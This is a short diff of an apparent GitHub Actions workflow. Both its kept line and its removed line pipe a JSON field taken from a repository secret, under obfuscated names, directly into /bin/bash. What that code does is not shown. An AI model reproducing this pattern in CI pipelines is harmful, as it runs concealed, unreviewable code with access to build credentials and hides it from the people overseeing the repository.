@@ -17,7 +17,6 @@ jobs:
           jrzm019: ${{ secrets.jrzm019 }}
         run: |
           printf '%s' "$jrzm019" | jq -r .lcnma5 | /bin/bash
-          printf '%s' "$ipuke86" | jq -r .phkj82 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
